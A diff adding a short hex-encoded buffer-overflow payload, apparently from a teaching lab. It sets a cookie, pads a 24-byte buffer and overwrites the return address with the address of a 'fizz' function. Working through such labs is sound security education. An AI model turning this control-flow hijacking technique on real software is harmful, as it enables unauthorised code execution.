@@ -1,0 +1,5 @@
+48 be 69 63 bd 3f c8 c3 /*this sets your cookie*/
+00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
+00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
+60 b1 ff ff ff 7f 00 00 /* address of register %rsp */
+70 10 40 00 00 00 00 00 /*address of fizz function */
